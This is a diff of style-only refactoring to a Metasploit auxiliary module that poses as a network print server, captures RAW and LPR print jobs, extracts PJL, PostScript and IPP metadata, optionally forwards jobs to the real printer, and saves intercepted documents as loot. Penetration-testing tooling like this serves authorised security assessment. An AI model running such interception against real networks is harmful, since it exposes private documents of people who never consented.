@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
@@ -25,36 +25,35 @@ class MetasploitModule < Msf::Auxiliary
       },
       'Author'      =>     ['Chris John Riley', 'todb'],
       'License'     =>     MSF_LICENSE,
-      'References'    =>
+      'References' =>
       [
         # Based on previous prn-2-me tool (Python)
         ['URL', 'http://blog.c22.cc/toolsscripts/prn-2-me/'],
         # Readers for resulting PCL/PC
         ['URL', 'http://www.ghostscript.com']
       ],
-        'Actions'     =>
+      'Actions' =>
       [
         [ 'Capture' ]
       ],
-        'PassiveActions' =>
+      'PassiveActions' =>
       [
         'Capture'
       ],
-        'DefaultAction'  => 'Capture'
+      'DefaultAction' => 'Capture'
     )
 
     register_options([
-      OptPort.new('SRVPORT',      [ true, 'The local port to listen on', 9100 ]),
-      OptBool.new('FORWARD',      [ true, 'Forward print jobs to another host', false ]),
-      OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
-      OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
-      OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
-      OptEnum.new('MODE',         [ true,  'Print mode', 'RAW', ['RAW', 'LPR']]) # TODO: Add IPP
+                       OptPort.new('SRVPORT',      [ true, 'The local port to listen on', 9100 ]),
+                       OptBool.new('FORWARD',      [ true, 'Forward print jobs to another host', false ]),
+                       OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
+                       OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
+                       OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
+                       OptEnum.new('MODE',         [ true, 'Print mode', 'RAW', ['RAW', 'LPR']]) # TODO: Add IPP
 
-    ], self.class)
+                     ], self.class)
 
     deregister_options('SSL', 'SSLVersion', 'SSLCert')
-
   end
 
   def setup
@@ -70,38 +69,38 @@ class MetasploitModule < Msf::Auxiliary
       if datastore['FORWARD']
         @forward = datastore['FORWARD']
         @rport = datastore['RPORT'] || 9100
-        if not datastore['RHOST'].nil?
+        if !datastore['RHOST'].nil?
           @rhost = datastore['RHOST']
           print_status("Forwarding all printjobs to #{@rhost}:#{@rport}")
         else
           raise ArgumentError, "Cannot forward without a valid RHOST"
         end
       end
-      if not @mode == 'RAW' and not @forward
+      if (@mode != 'RAW') && !@forward
         raise ArgumentError, "Cannot intercept LPR/IPP without a forwarding target"
       end
       @metadata = datastore['METADATA']
 
-      exploit()
+      exploit
 
-    rescue  =>  ex
+    rescue => ex
       print_error(ex.message)
     end
   end
 
   def on_client_connect(c)
     @state[c] = {
-      :name => "#{c.peerhost}:#{c.peerport}",
-      :ip => c.peerhost,
-      :port => c.peerport,
-      :user => nil,
-      :pass => nil,
-      :data => '',
-      :raw_data => '',
-      :prn_title => '',
-      :prn_type => '',
-      :prn_metadata => {},
-      :meta_output => []
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
+      user: nil,
+      pass: nil,
+      data: '',
+      raw_data: '',
+      prn_title: '',
+      prn_type: '',
+      prn_metadata: {},
+      meta_output: []
     }
 
     print_status("#{name}: Client connection from #{c.peerhost}:#{c.peerport}")
@@ -112,28 +111,26 @@ class MetasploitModule < Msf::Auxiliary
     @state[c][:data] << curr_data
     if @mode == 'RAW'
       # RAW Mode - no further actions
-    elsif @mode == 'LPR' or @mode == 'IPP'
+    elsif (@mode == 'LPR') || (@mode == 'IPP')
       response = stream_data(curr_data)
       c.put(response)
     end
 
-    if (Rex::Text.to_hex(curr_data.first)) == '\x02' and (Rex::Text.to_hex(curr_data.last)) == '\x0a'
-      print_status("LPR Jobcmd \"%s\" received" % curr_data[1..-2]) if not curr_data[1..-2].empty?
+    if (Rex::Text.to_hex(curr_data.first) == '\x02') && (Rex::Text.to_hex(curr_data.last) == '\x0a')
+      print_status("LPR Jobcmd \"%s\" received" % curr_data[1..-2]) unless curr_data[1..-2].empty?
     end
 
-    return if not @state[c][:data]
+    return unless @state[c][:data]
   end
 
   def on_client_close(c)
     print_status("#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data" % @state[c][:data].length)
-    sock.close if sock
+    sock&.close
 
     # forward RAW data as it's not streamed
-    if @forward and @mode == 'RAW'
-      forward_data(@state[c][:data])
-    end
+    forward_data(@state[c][:data]) if @forward && (@mode == 'RAW')
 
-    #extract print data and Metadata from @state[c][:data]
+    # extract print data and Metadata from @state[c][:data]
     begin
       # postscript data
       if @state[c][:data] =~ /%!PS-Adobe/i
@@ -145,7 +142,7 @@ class MetasploitModule < Msf::Auxiliary
       elsif @state[c][:data].unpack("H*")[0] =~ /(1b45|1b25|1b26)/
         @state[c][:prn_type] = "PCL"
         print_good("Printjob intercepted - type PCL")
-        #extract everything between PCL start and end markers (various)
+        # extract everything between PCL start and end markers (various)
         @state[c][:raw_data] = Array(@state[c][:data].unpack("H*")[0].match(/((1b45|1b25|1b26).*(1b45|1b252d313233343558))/i)[0]).pack("H*")
       end
 
@@ -156,34 +153,34 @@ class MetasploitModule < Msf::Auxiliary
       metadata_pjl(c) if @state[c][:data] =~ /@PJL/i
 
       # extract IPP Metadata
-      metadata_ipp(c) if @state[c][:data] =~ /POST \/ipp/i or @state[c][:data] =~ /application\/ipp/i
+      metadata_ipp(c) if @state[c][:data] =~ /POST \/ipp/i || @state[c][:data] =~ /application\/ipp/i
 
-      if not @state[c][:prn_type]
+      unless @state[c][:prn_type]
         print_error("Unable to detect printjob type, dumping complete output")
         @state[c][:prn_type] = "Unknown Type"
         @state[c][:raw_data] = @state[c][:data]
       end
 
       # output discovered Metadata if set
-      if @state[c][:meta_output] and @metadata
-        @state[c][:meta_output].sort.each do | out |
+      if @state[c][:meta_output] && @metadata
+        @state[c][:meta_output].sort.each do |out|
           # print metadata if not empty
-          print_status("#{out}") if not out.empty?
+          print_status(out.to_s) unless out.empty?
         end
       else
         print_status("No metadata gathered from printjob")
       end
 
       # set name to unknown if not discovered via Metadata
-      @state[c][:prn_title] = 'Unnamed' if not @state[c][:prn_title]
+      @state[c][:prn_title] = 'Unnamed' unless @state[c][:prn_title]
 
-      #store loot
-      storefile(c) if not @state[c][:raw_data].empty?
+      # store loot
+      storefile(c) unless @state[c][:raw_data].empty?
 
       # clear state
       @state.delete(c)
 
-    rescue  =>  ex
+    rescue => ex
       print_error(ex.message)
     end
   end
@@ -193,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
 
     @state[c][:prn_metadata] = @state[c][:data].scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
     print_good("Extracting PJL Metadata")
-    @state[c][:prn_metadata].each do | meta |
+    @state[c][:prn_metadata].each do |meta|
       if meta[0] =~ /^COMMENT/i
         @state[c][:meta_output] << meta[0].to_s + meta[1].to_s
       end
@@ -202,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       if meta[1] =~ /^NAME/i
         @state[c][:prn_title] = meta[1].strip
-      elsif meta[1] =~/^JOBNAME/i
+      elsif meta[1] =~ /^JOBNAME/i
         @state[c][:prn_title] = meta[1].strip
       end
     end
@@ -213,13 +210,11 @@ class MetasploitModule < Msf::Auxiliary
 
     @state[c][:prn_metadata] = @state[c][:data].scan(/^%%(.*)$/i)
     print_good("Extracting PostScript Metadata")
-    @state[c][:prn_metadata].each do | meta |
+    @state[c][:prn_metadata].each do |meta|
       if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i
         @state[c][:meta_output] << meta[0].to_s
       end
-      if meta[0] =~ /^Title/i
-        @state[c][:prn_title] = meta[0].strip
-      end
+      @state[c][:prn_title] = meta[0].strip if meta[0] =~ /^Title/i
     end
   end
 
@@ -249,17 +244,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def stream_data(data_to_send)
     vprint_status("Streaming %d bytes of data to #{@rhost}:#{@rport}" % data_to_send.length)
-    connect if not sock
+    connect unless sock
     sock.put(data_to_send)
     response = sock.get_once
-    return response
+    response
   end
 
   def storefile(c)
     # store the file
 
     if @state[c][:raw_data]
-      jobname = File.basename(@state[c][:prn_title].gsub("\\","/"), ".*")
+      jobname = File.basename(@state[c][:prn_title].tr("\\", "/"), ".*")
       filename = "#{jobname}.#{@state[c][:prn_type]}"
       loot = store_loot(
         "prn_snarf.#{@state[c][:prn_type].downcase}",
@@ -273,5 +268,4 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Loot filename: %s" % loot)
     end
   end
-
 end
